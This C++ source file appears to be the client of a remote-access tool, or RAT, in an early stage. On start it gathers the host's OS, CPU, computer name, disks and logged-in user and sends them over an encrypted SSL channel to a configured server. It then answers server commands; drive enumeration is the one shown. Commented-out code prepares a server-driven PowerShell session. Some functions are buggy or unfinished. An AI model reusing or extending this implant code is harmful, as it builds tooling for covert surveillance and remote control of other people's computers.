﻿#include "Powershell.h"
#include <AES_CBC256.h>
#include "ClientInitial.h"
#include "Package.h"

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8888
#define CERTF  "client.crt" 
#define KEYF  "client.key"  
#define CACERT "ca.crt"     


extern "C"
{
#include <openssl/applink.c>
};
HANDLE g_hReadOfChild;
HANDLE g_hWriteOfChild;
HANDLE g_hReadOfParent;
HANDLE g_hWriteOfParent;

//SendData
int WINAPI SendFunc(LPVOID lpParameter)
{
	cout << "start send..." << endl;
	SSL* sslHandle = (SSL*)lpParameter;
	AES_CBC256 m_pcAES_CBC256;
	string strMessage;
	Data data = { 0 };
	// Send Data
	while (true)
	{
		cout << "input your message:" << endl;
		cin >> strMessage;
		size_t length = 0;
		int bytesSent = m_pcAES_CBC256.SSL_AES256_sendData(m_pcAES_CBC256, data, sslHandle);

		if (bytesSent <= 0) {
			std::cout << "Failed to send message!" << std::endl;
			return 0;
		}
		std::cout << "Sent message: " << strMessage << std::endl;
	}
	return 0;

}
//RecieveData
int  RecvFunc(SSL* sslHandle)
{
	Data data = {0};
	cout << "start recv..." << endl;
	int bytesRecv = 1;
	AES_CBC256 m_pcAES_CBC256;
	
	do {
		bytesRecv = m_pcAES_CBC256.SSL_AES256_recvData(m_pcAES_CBC256, data, sslHandle);
		switch (data.nFlag)
		{
		case 1://FileBrose
		{
			char	DriveString[256];

			char	FileSystem[MAX_PATH];
			char* pDrive = NULL;
			GetLogicalDriveStrings(sizeof(DriveString), DriveString);
			pDrive = DriveString;

			unsigned __int64	HDAmount = 0;
			unsigned __int64	HDFreeSpace = 0;
			unsigned long		AmntMB = 0; 
			unsigned long		FreeMB = 0; 
			DWORD dwOffset = 0;
			for (dwOffset = 0; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
			{
				memset(FileSystem, 0, sizeof(FileSystem));
			
				GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
				SHFILEINFO	sfi;
				SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);

				int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
				int	nFileSystemLen = lstrlen(FileSystem) + 1;

		
				if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
				{
					AmntMB = HDAmount / 1024 / 1024;
					FreeMB = HDFreeSpace / 1024 / 1024;
				}
				else
				{
					AmntMB = 0;
					FreeMB = 0;
				}
			
				data.szMsg[dwOffset] = pDrive[0];
				data.szMsg[dwOffset + 1] = GetDriveType(pDrive);


				memcpy(data.szMsg + dwOffset + 2, &AmntMB, sizeof(unsigned long));
				memcpy(data.szMsg + dwOffset + 6, &FreeMB, sizeof(unsigned long));

				memcpy(data.szMsg + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
				memcpy(data.szMsg + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);

				dwOffset += 10 + nTypeNameLen + nFileSystemLen;
			}
			int bytesSent = m_pcAES_CBC256.SSL_AES256_sendData(m_pcAES_CBC256, data, sslHandle);
			if (bytesSent <= 0) {
				std::cout << "Failed to send message!" << std::endl;
				return 0;
			}

		}
		default:
			break;
		}
		cout << "Received  Server message: " << data.szMsg << std::endl;
	} while (bytesRecv > 0);
	return 0;
}


int main() {
	cout << getOsInfo() << endl
	<<getCpuInfo() << endl
	<<GetPCName() << endl
	<< GetDisk() << endl
	<< GetCurrentUserName() << endl;
	PC_INFO pc_info;
	strcpy(pc_info.szCPU, getCpuInfo().c_str());
	strcpy(pc_info.szPC_NAME, GetPCName().c_str());
	strcpy(pc_info.szDISK, GetDisk().c_str());
	strcpy(pc_info.szCURRENT_USER, GetCurrentUserName().c_str());
	strcpy(pc_info.szOS, getOsInfo().c_str());



	int seed_int[100];
	int err;
	////Winsock_init 
	if (!InitialWincock())
	{
		return 0;
	}
	//Initial SSL
	SSL_CTX* sslContext = SSL_Initialize();
	//set Cipher suites
	if (!SSL_CTX_set_cipher_list(sslContext, "AES256-SHA"))
	{
		ERR_print_errors_fp(stderr);
		SSL_CTX_free(sslContext);
		return 1;
	}

	// generate rand number（WIN32 must add it）
	srand((unsigned)time(NULL));
	for (int i = 0; i < 100; i++)
		seed_int[i] = rand();
	RAND_seed(seed_int, sizeof(seed_int));



	//create socket
	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sockClient == INVALID_SOCKET)
	{
		cerr << "socket failed." << endl;
		WSACleanup();
		return 1;
	}
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(SERVER_PORT);


	//request to Server
	if (connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)) == SOCKET_ERROR)
	{
		cerr << "connect failed." << endl;
		closesocket(sockClient);
		return 1;
	}
	cout << "connectting server" << SERVER_PORT << "..." << endl;
	SSL* sslHandle = SSL_new(sslContext);
	if (sslHandle == nullptr)
	{
		cerr << "SSL_new Failed" << endl;
	}
	SSL_set_fd(sslHandle, static_cast<int> (sockClient));
	int Ret = SSL_connect(sslHandle);
	if (Ret <= 0)
	{
		handle_error(__FILE__, __LINE__, "SSL_connect() failed");
	}



	if (Ret != 1)
	{
		ERR_print_errors_fp(stderr);
		SSL_shutdown(sslHandle);
		closesocket(sockClient);
		return 1;
	}
	cout << "connect success" << SERVER_PORT << "..." << endl;
	Sleep(1000);

	AES_CBC256 AES_CBC256;
	int bytesSent = AES_CBC256.SSL_AES256_sendData(AES_CBC256, pc_info, sslHandle);

	



	HANDLE threadRec = NULL;
	HANDLE threadSend = NULL;
	if (threadSend == NULL)
	{
		threadSend = ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendFunc, sslHandle, 0, NULL);   //创建线程, 发送数据
	}
	if (threadRec == NULL)
	{
		threadRec = ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecvFunc, sslHandle, 0, NULL);
	}
	HANDLE harr[2] = { threadRec,threadSend };
	WaitForMultipleObjects(2, harr, true, INFINITE);

	if (threadRec != NULL)
		CloseHandle(threadRec);
	if (threadSend != NULL)
		CloseHandle(threadSend);

	SSL_shutdown(sslHandle);
	closesocket(sockClient);
	WSACleanup();
	SSL_CTX_free(sslContext);



	//thread Recv_thread(RecvFunc, sslHandle);
	//thread Send_thread(SendFunc, sslHandle);
	//Recv_thread.detach();
	//Send_thread.detach();

	////Send Data
	//char buffer[1024] = "Hello Server";
	//if (SSL_write(sslHandle, buffer, strlen(buffer)) < 0)
	//{
	//	ERR_print_errors_fp(stderr);
	//	SSL_shutdown(sslHandle);
	//	closesocket(sockClient);
	//	return 1;
	//}

	////Recieve Data
	//char recvBuffer[1024] = { 0 };
	//int recvLength = SSL_read(sslHandle, recvBuffer, sizeof(recvBuffer));
	//if (recvLength > 0)
	//{
	//	 cout << "Received :  " <<  endl << recvBuffer;
	//}
	//Start powershell
	//Powershell powershell;
	//if (false == powershell.StartCmd("powershell.exe"))
	//{
	//	 cout << "create powershell.exe process fail" <<  endl;
	//	return -1;
	//}
	// string outstr;
	//powershell.GetOutput(">", 3000, outstr);
	// cout << outstr <<  endl;
	//powershell.Input("dir");
	//powershell.GetOutput(">", 3000, outstr);
	// cout << outstr <<  endl;

	return 0;
}
